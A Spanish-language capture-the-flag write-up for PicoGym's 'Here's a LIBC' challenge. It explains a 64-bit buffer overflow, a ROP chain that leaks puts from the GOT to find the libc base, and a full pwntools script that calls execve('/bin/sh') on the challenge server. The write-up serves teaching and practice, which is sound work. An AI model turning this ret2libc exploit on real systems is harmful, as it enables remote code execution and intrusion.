# Here's a LIBC - PicoGym

## Reconocimiento

Se nos da un ejecutable que utiliza una versión anterior de *libc* (que nos da el ejercicio). Por lo tanto comenzamos *patcheando* el binario con [[pwninit]]:

```bash
pwninit
```
```pwninit
bin: ./vuln
libc: ./libc.so.6

fetching linker
https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.27-3ubuntu1.2_amd64.deb
unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb
setting ./ld-2.27.so executable
copying ./vuln to ./vuln_patched
running patchelf on ./vuln_patched
writing solve.py stub
```

Ya podemos ejecutarlo, aunque no vemos gran cosa, simplemente un programa que devuelve tu input en *camel-case*. SI le pasamos [[checksec]]:

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68 Symbols
```

Lo único destacable es que es un binario de **64 bits** y que tiene el **bit NX**, por lo que no podremos ejecutar código del stack. Mediante [[ghidra]], descubrimos que es posible realizar un [[Buffer overflow]], como no hay ninguna función que nos de la flag, podemos intentar saltar a **LIBC**.

Sin embargo, falta una cosa: la función de *libc* a la que saltar. Por suerte en el código tenemos una función *puts* que imprime el valor guardado en una dirección que se le pasa como argumento. Haremos lo siguiente:

1. Creamos una [ROP chain](https://en.wikipedia.org/wiki/Return-oriented_programming), utilizando *gadgets locales*, para pasar a _puts_ la dirección de la [GOT table](https://ctf101.org/binary-exploitation/what-is-the-got/) (se puede porque el binario no es PIE, además las direcciones de la GOT son estáticas y visibles desde [[ghidra]]).
2. Saltamos a *puts* (aunque es más seguro hacerlo desde la **PLT**)
3. Imprimimos la dirección (dinámica) de *puts*.
4. Forzamos al programa a retornar a la primera instrucción de *main*, para poder volver a ejecutar el buffer overflow.
5. Volvemos a crear una *ROP chain* para saltar a **execve** y ejecutar */bin/sh*.

## Explotación

Lo primero será encontrar el *offset*, podemos hacerlo con [[gdb]] y [[pwntools]] (con **cyclic**). En mi caso es `136`.

Además necesitamos algunos gadgets:

- El gadget `pop rdi, ret;` -> `0x0000000000400913`
- La dirección en la GOT de *puts*.
- La dirección en la PLT de *puts*.
- La dirección de la primera instrucción de *main* -> `0x0000000000400771`

Para el primero puedes utilizar [[ropper]], y el resto se pueden sacar con [[ghidra]] (aunque los sacaremos directamente con [[pwntools]]).

Así, teniendo la dirección de *puts* de la *libc*, podemos calcular la *dirección base*:

```
Libc_base = Leaked_address - Static_offset
```

Asumiendo que la dirección base de la librería es `0x0000000000000000`.

Con la dirección base de *libc*, seremos capaces de sacar (mediante [[pwntools]]):

- *execve*
- `/bin/sh\x00`
- Un puntero nulo (`\x00`)

Para la segunda cadena necesitaremos además (con [[ropper]]):

- `pop rsi, ret;`
- `pop rdx, ret;`

```python
#!/bin/python3
from pwn import *

HOST = 'mercury.picoctf.net'
PORT = <insert_your_port>
EXE  = './vuln'

if args.EXPLOIT:
    r = remote(HOST, PORT)
    libc = ELF('./libc.so.6')

exe = ELF(EXE)

#Found with ropper
pop_rdi = 0x400913
pop_rsi = 0x023e8a
pop_rdx = 0x001b96
offset  = libc.symbols['puts']

r.recvuntil(b'sErVeR!\n')

payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])    #Base dir of main

r.sendline(payload)
r.recvline()

leak = r.recv(6)+b'\x00\x00'   #To fix allignment (8 bytes)
leak = u64(leak)

libc.address = leak - offset

binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
nullptr = next(libc.search(b'\x00'*8))
execve = libc.symbols['execve']

payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address + pop_rdx)
payload += p64(nullptr)
payload += p64(execve)

r.sendline(payload)
r.interactive()
```

Y deberíamos lograr una shell. Ya solo quedaría abrir la flag con *cat*.